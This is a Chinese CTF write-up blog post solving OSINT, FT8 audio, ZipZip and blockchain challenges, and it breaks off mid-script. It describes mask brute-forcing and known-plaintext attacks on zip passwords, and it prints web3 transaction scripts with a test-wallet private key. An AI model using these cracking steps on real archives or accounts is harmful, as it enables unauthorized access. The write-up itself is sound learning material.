<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CTF's wp | Doraemonblogs</title><meta name="author" content="Doraemon"><meta name="copyright" content="Doraemon"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Misc超级侦探根据题目提示,Flag为拍摄点背后的停车场电话,flag格式为L3HSEC{}通过google搜图，对比图片中的关键信息，查找到该位置大概位于日本某博物馆附近再通过google earth查看近景图，找到附近停车场的信息，找到flag ft8题目给出一段循环播放的音频，猜测是音频内容中隐藏信息根据题目WebSDR - FT8,搜索tf8了解到  FT8是一种专为业余无线电台之间进行">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF&#39;s wp">
<meta property="og:url" content="https://doraemonblogs.github.io/2024/10/12/wp/index.html">
<meta property="og:site_name" content="Doraemonblogs">
<meta property="og:description" content="Misc超级侦探根据题目提示,Flag为拍摄点背后的停车场电话,flag格式为L3HSEC{}通过google搜图，对比图片中的关键信息，查找到该位置大概位于日本某博物馆附近再通过google earth查看近景图，找到附近停车场的信息，找到flag ft8题目给出一段循环播放的音频，猜测是音频内容中隐藏信息根据题目WebSDR - FT8,搜索tf8了解到  FT8是一种专为业余无线电台之间进行">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://doraemonblogs.github.io/img/top_img/9.jpg">
<meta property="article:published_time" content="2024-10-11T16:00:00.000Z">
<meta property="article:modified_time" content="2024-10-12T04:00:00.000Z">
<meta property="article:author" content="Doraemon">
<meta property="article:tag" content="Flag">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://doraemonblogs.github.io/img/top_img/9.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://doraemonblogs.github.io/2024/10/12/wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: true
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Doraemon","link":"链接: ","source":"来源: Doraemonblogs","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CTF\'s wp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-10-12 12:00:00'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/universe.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
<link rel="stylesheet" href="/css/runtime.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/profile.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/"><i class="fa-fw icon-home"></i><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-home"></use></svg><span> 首页</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/archives/"><i class="fa-fw icon-guidang"></i><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-guidang"></use></svg><span> 归档</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/tags/"><i class="fa-fw icon-icon_pricetag"></i><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-icon_pricetag"></use></svg><span> 标签</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/categories/"><i class="fa-fw icon-fenlei"></i><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-fenlei"></use></svg><span> 分类</span></a></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-liebiao"></use></svg><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-a-Sheetmusic">                   </use></svg><span> 音乐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/movies/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon--dianyingpiao-">                   </use></svg><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/comments/"><i class="fa-fw icon-liuyanban"></i><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-liuyanban"></use></svg><span> 留言板</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/link/"><i class="fa-fw icon-lianjie"></i><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-lianjie"></use></svg><span> 友链</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/about/"><i class="fa-fw icon-xinxingye"></i><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-xinxingye"></use></svg><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/top_img/9.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Doraemonblogs"><span class="site-name">Doraemonblogs</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i></a></div><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/"><i class="fa-fw icon-home"></i><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-home"></use></svg><span> 首页</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/archives/"><i class="fa-fw icon-guidang"></i><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-guidang"></use></svg><span> 归档</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/tags/"><i class="fa-fw icon-icon_pricetag"></i><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-icon_pricetag"></use></svg><span> 标签</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/categories/"><i class="fa-fw icon-fenlei"></i><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-fenlei"></use></svg><span> 分类</span></a></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-liebiao"></use></svg><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-a-Sheetmusic">                   </use></svg><span> 音乐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/movies/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon--dianyingpiao-">                   </use></svg><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/comments/"><i class="fa-fw icon-liuyanban"></i><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-liuyanban"></use></svg><span> 留言板</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/link/"><i class="fa-fw icon-lianjie"></i><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-lianjie"></use></svg><span> 友链</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/about/"><i class="fa-fw icon-xinxingye"></i><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-xinxingye"></use></svg><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CTF's wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-11T16:00:00.000Z" title="发表于 2024-10-12 00:00:00">2024-10-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-12T04:00:00.000Z" title="更新于 2024-10-12 12:00:00">2024-10-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>19分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CTF's wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img gist" style="background-image: url(/img/top_img/9.jpg)"></div><article class="post-content" id="article-container"><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="超级侦探"><a href="#超级侦探" class="headerlink" title="超级侦探"></a>超级侦探</h3><p>根据题目提示,<strong>Flag为拍摄点背后的停车场电话,flag格式为L3HSEC{}</strong><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/search-3.png"><br>通过google搜图，对比图片中的关键信息，查找到该位置大概位于日本某博物馆附近<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/search-4.jpg"><br>再通过google earth查看近景图，找到附近停车场的信息，找到flag<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/search-1.jpg"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/search-2.png"></p>
<h3 id="ft8"><a href="#ft8" class="headerlink" title="ft8"></a>ft8</h3><p>题目给出一段循环播放的音频，猜测是音频内容中隐藏信息<br>根据题目<strong>WebSDR - FT8</strong>,搜索tf8了解到</p>
<blockquote>
<p>FT8是一种专为业余无线电台之间进行快速、准确通信而设计的数字协议，尤其在弱信号条件下表现出色。FT8协议只占用50Hz的带宽，可以解码人耳难以辨别的微弱信号。即使在高楼林立的社区，使用普通的手持天线也可以与欧洲等地进行通信。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/ft8-1.png"></p>
<p>再查询ft8解码的工具，使用<strong>jtdx</strong>进行解码，得到flag<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/ft8-2.jpg"></p>
<h3 id="ZipZip"><a href="#ZipZip" class="headerlink" title="ZipZip"></a>ZipZip</h3><p>通过WinRAR解压时发现提示信息<strong>L3HSEC??????L3HSEC</strong>,猜测可能为解码的口令<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/zipzip-1.png"><br>使用<strong>achpr</strong>工具尝试强行爆破失败后，利用<strong>L3HSEC??????L3HSEC</strong>作为掩码进行掩码攻击，<br>最后在范围为（0-9）之间时成功恢复口令<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/zipzip-2.png"><br>利用口令打开ZipZip压缩包，里面包含gift.zip和secret.zip两个压缩包，且都需要密钥才能解开<br>观察到两个压缩包内容相似，且secret.zip内多一个secret.txt文件，猜测flag藏于其中<br>再次尝试强行爆破secret.zip失败后，考虑到gift.zip可能有有用信息，于是对gitf.zip采用明文攻击，最终得到口令，成功打开secret.zip压缩包<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/zipzip-3.png"><br>观察secret.txt文件猜测为JSFuck编码<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/zipzip-4.png"><br>使用在线工具进行JSFuck解码，观察解码猜测为摩斯密码<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/zipzip-6.png"><br>使用在线工具进行摩斯密码解码后得到与flag<strong>高度相似</strong>的字符串<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTF/zipzip-5.png"><br>最后猜测 flag为<strong>L3HSEC{WOW_U@RE_FUCKING_SM4RT!}</strong></p>
<h3 id="你知道Blockchain嘛"><a href="#你知道Blockchain嘛" class="headerlink" title="你知道Blockchain嘛?"></a>你知道Blockchain嘛?</h3><p>搜索关键词Blockchain得到这是一道区块链的题目，参考<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Xe4y1e7sQ/?spm_id_from=333.337.search-card.all.click&vd_source=1046cf6b20b652e0071d6a870e3b9fdb">bilibili</a>上相关视频</p>
<ol>
<li><p>ncat 119.8.106.225 20000连接服务器<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/doraemonblogs/themes/butterfly/source/img/CTF/blockchain-1.png"><br>根据选项提示做出决策<br>首先选择1，题目会给出部署账户(deployer account)和标志身份的信息(token),要求向该账户转入0.001测试币</p>
</li>
<li><p>连接以太坊结点，初始化账户信息</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到以太坊节点</span></span><br><span class="line">infura_url = <span class="string">&quot;http://119.8.106.225:8545&quot;</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(infura_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个新的账户</span></span><br><span class="line">account = Account.create()</span><br><span class="line"><span class="comment"># 打印账户地址、私钥和公钥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;地址: <span class="subst">&#123;account.address&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;私钥: <span class="subst">&#123;account.key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/doraemonblogs/themes/butterfly/source/img/CTF/blockchain-2.png"></p>
</li>
<li><p>使用生成的地址在题目提供的<strong>水龙头</strong>领取测试币<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/doraemonblogs/themes/butterfly/source/img/CTF/blockchain-3.png"></p>
</li>
<li><p>将自己账户的测试币转移一部分到部署账户完成交易</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进行交易</span></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到 RPC 地址</span></span><br><span class="line">rpc_url = <span class="string">&quot;http://119.8.106.225:8545&quot;</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(rpc_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的测试钱包地址和私钥</span></span><br><span class="line">eth_address = <span class="string">&quot;0xd506f9E66bD092248Ea48c3709f4Db9A57AFF67e&quot;</span></span><br><span class="line">private_key = <span class="string">&quot;e899bd263df411b26cff19aec59d4df1b050d47a231c2e774b090142b6076b9c&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标部署账户（deployer account）</span></span><br><span class="line">deployer_address = <span class="string">&quot;0x6870802A4a17D1D88Dd825ED40f95bb1C9e9D33C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取链 ID</span></span><br><span class="line">chain_id = w3.eth.chain_id</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建交易</span></span><br><span class="line">tx = &#123;</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(eth_address),</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: deployer_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: w3.to_wei(<span class="number">0.001</span>, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">25000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: chain_id  <span class="comment"># 添加链 ID</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用私钥签名交易</span></span><br><span class="line">signed_tx = w3.eth.account.sign_transaction(tx, private_key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送交易</span></span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;交易已发送，交易哈希: <span class="subst">&#123;w3.to_hex(tx_hash)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待交易确认</span></span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;交易成功！交易哈希: <span class="subst">&#123;w3.to_hex(tx_hash)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/doraemonblogs/themes/butterfly/source/img/CTF/blockchain-4.png"></p>
</li>
<li><p>返回命令行，输入2，得到合约地址<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/doraemonblogs/themes/butterfly/source/img/CTF/blockchain-5.png"></p>
</li>
<li><p>选择4，查看<strong>contract source code</strong> ，通过python脚本向合约地址发起攻击<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/doraemonblogs/themes/butterfly/source/img/CTF/blockchain-7.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/doraemonblogs/themes/butterfly/source/img/CTF/blockchain-6.png"><br>攻击成功，最后在命令行得到flag</p>
</li>
</ol>
<h3 id="什么-注入-真的假的"><a href="#什么-注入-真的假的" class="headerlink" title="什么?注入?真的假的"></a>什么?注入?真的假的</h3><ol>
<li>ncat 119.8.106.225 20001连接服务器<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/doraemonblogs/themes/butterfly/source/img/CTF/inject-2.png"><br>根据选项提示做出决策<br>首先选择1，题目会给出部署账户(deployer account)和标志身份的信息(token),要求向该账户转入0.001测试币</li>
<li>连接以太坊结点，初始化账户信息<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/doraemonblogs/themes/butterfly/source/img/CTF/inject-4.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到以太坊节点</span></span><br><span class="line">infura_url = <span class="string">&quot;http://119.8.106.225:8546&quot;</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(infura_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个新的账户</span></span><br><span class="line">account = Account.create()</span><br><span class="line"><span class="comment"># 打印账户地址、私钥和公钥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;地址: <span class="subst">&#123;account.address&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;私钥: <span class="subst">&#123;account.key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></li>
<li>使用生成的账户地址去水龙头领取测试币<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/doraemonblogs/themes/butterfly/source/img/CTF/inject-5.png"></li>
<li>完成交易,获取合约地址<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/doraemonblogs/themes/butterfly/source/img/CTF/inject-6.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/doraemonblogs/themes/butterfly/source/img/CTF/inject-3.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 